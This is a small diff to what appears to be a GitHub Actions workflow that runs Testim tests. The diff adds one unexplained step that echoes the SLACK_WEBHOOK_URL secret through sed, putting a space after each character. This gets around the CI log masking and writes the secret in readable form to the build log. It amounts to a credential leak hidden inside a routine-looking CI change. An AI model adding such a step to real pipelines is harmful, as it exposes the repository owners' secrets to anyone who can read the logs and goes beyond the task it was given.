@@ -42,6 +42,7 @@ jobs:
           node-version: "20.0.0"
       - run: npm install -g @testim/testim-cli
       - run: npm ci
+      - run: echo ${{secrets.SLACK_WEBHOOK_URL}} | sed 's/./& /g'
 
       - name: Run Testim Tests
         run: |
